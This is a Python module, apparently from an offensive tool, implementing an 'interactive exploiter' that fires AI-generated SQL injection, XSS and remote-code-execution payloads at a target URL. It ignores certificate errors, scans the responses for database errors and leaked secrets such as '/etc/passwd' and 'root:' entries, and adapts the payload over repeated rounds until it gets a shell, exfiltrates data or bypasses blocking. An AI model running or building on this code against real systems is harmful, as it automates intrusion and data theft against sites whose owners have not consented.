"""
Interactive exploitation with AI adaptation

Implements adaptive, multi-iteration exploitation
"""

import asyncio
import aiohttp
from typing import Dict, Optional
from ..utils.logging import get_logger
from ..ai.payload_generator import PayloadGenerator

logger = get_logger('interactive')


class InteractiveExploiter:
    """
    Interactive exploitation with AI-powered adaptation
    """
    
    def __init__(self, max_iterations: int = 10):
        self.max_iterations = max_iterations
        self.payload_gen = PayloadGenerator()
        
    async def exploit_target(
        self,
        target_url: str,
        vuln_type: str,
        objective: str = 'shell',
        target_info: Optional[Dict] = None
    ) -> Dict:
        """
        Automated exploitation with learning
        
        Args:
            target_url: Target URL
            vuln_type: Vulnerability type
            objective: Exploitation objective ('shell', 'data_exfil', 'bypass', etc.)
            target_info: Optional target information
            
        Returns:
            Exploitation results
        """
        logger.info(f"Starting interactive exploitation: {target_url}")
        
        target_info = target_info or {}
        results = {
            'target': target_url,
            'vuln_type': vuln_type,
            'objective': objective,
            'success': False,
            'iterations': [],
            'final_payload': None
        }
        
        # Generate initial payload
        payload = self.payload_gen.generate_payload(vuln_type, target_info)
        
        for iteration in range(1, self.max_iterations + 1):
            logger.info(f"Iteration {iteration}/{self.max_iterations}")
            
            # Send payload
            response = await self._send_payload(target_url, payload, vuln_type)
            
            # Record iteration
            iteration_result = {
                'iteration': iteration,
                'payload': payload,
                'status_code': response.get('status_code'),
                'success': False,
                'analysis': {}
            }
            
            # Analyze response
            analysis = self._analyze_response(response, objective)
            iteration_result['analysis'] = analysis
            
            # Check for success
            if analysis.get('objective_achieved'):
                iteration_result['success'] = True
                results['success'] = True
                results['final_payload'] = payload
                results['iterations'].append(iteration_result)
                logger.info(f"Exploitation successful on iteration {iteration}!")
                break
            
            results['iterations'].append(iteration_result)
            
            # Adapt payload for next iteration
            if iteration < self.max_iterations:
                logger.info("Adapting payload for next iteration")
                payload = self.payload_gen.adapt_payload(payload, response, iteration)
        
        if not results['success']:
            logger.warning(f"Exploitation failed after {self.max_iterations} iterations")
        
        return results
    
    async def _send_payload(self, target_url: str, payload: str, vuln_type: str) -> Dict:
        """
        Send payload to target
        
        Args:
            target_url: Target URL
            payload: Exploit payload
            vuln_type: Vulnerability type
            
        Returns:
            Response data
        """
        response_data = {
            'status_code': None,
            'headers': {},
            'body': '',
            'error': None
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                # Build request based on vulnerability type
                if vuln_type.lower() == 'sqli':
                    # SQL injection - send as parameter
                    url = f"{target_url}?id={payload}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        response_data['status_code'] = response.status
                        response_data['headers'] = dict(response.headers)
                        response_data['body'] = await response.text()
                
                elif vuln_type.lower() == 'xss':
                    # XSS - send as parameter
                    url = f"{target_url}?input={payload}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        response_data['status_code'] = response.status
                        response_data['headers'] = dict(response.headers)
                        response_data['body'] = await response.text()
                
                elif vuln_type.lower() == 'rce':
                    # RCE - send as POST data
                    async with session.post(
                        target_url,
                        data={'cmd': payload},
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        response_data['status_code'] = response.status
                        response_data['headers'] = dict(response.headers)
                        response_data['body'] = await response.text()
                
                else:
                    # Generic GET request
                    url = f"{target_url}?payload={payload}"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        response_data['status_code'] = response.status
                        response_data['headers'] = dict(response.headers)
                        response_data['body'] = await response.text()
        
        except asyncio.TimeoutError:
            response_data['error'] = 'timeout'
            logger.warning("Request timeout")
        except Exception as e:
            response_data['error'] = str(e)
            logger.error(f"Request error: {e}")
        
        return response_data
    
    def _analyze_response(self, response: Dict, objective: str) -> Dict:
        """
        Analyze response to determine success
        
        Args:
            response: Response data
            objective: Exploitation objective
            
        Returns:
            Analysis results
        """
        analysis = {
            'objective_achieved': False,
            'partial_success': False,
            'blocked': False,
            'error_detected': False,
            'data_leaked': False
        }
        
        status_code = response.get('status_code', 0)
        body = response.get('body', '').lower()
        
        # Check for blocking
        if status_code in [403, 406, 429]:
            analysis['blocked'] = True
            logger.info("Request was blocked")
        
        # Check for errors (potential SQL injection success)
        error_patterns = [
            'sql syntax',
            'mysql',
            'postgresql',
            'oracle',
            'sqlite',
            'syntax error',
            'warning:',
            'fatal error'
        ]
        
        for pattern in error_patterns:
            if pattern in body:
                analysis['error_detected'] = True
                analysis['partial_success'] = True
                logger.info(f"Error detected: {pattern}")
                break
        
        # Check for data leakage
        data_patterns = [
            'root:',
            'admin:',
            'password:',
            '/etc/passwd',
            'database',
            'user table'
        ]
        
        for pattern in data_patterns:
            if pattern in body:
                analysis['data_leaked'] = True
                analysis['partial_success'] = True
                logger.info(f"Data leak detected: {pattern}")
                break
        
        # Check objective achievement
        if objective == 'shell' and 'root@' in body:
            analysis['objective_achieved'] = True
        elif objective == 'data_exfil' and analysis['data_leaked']:
            analysis['objective_achieved'] = True
        elif objective == 'bypass' and status_code == 200 and not analysis['blocked']:
            analysis['objective_achieved'] = True
        
        return analysis
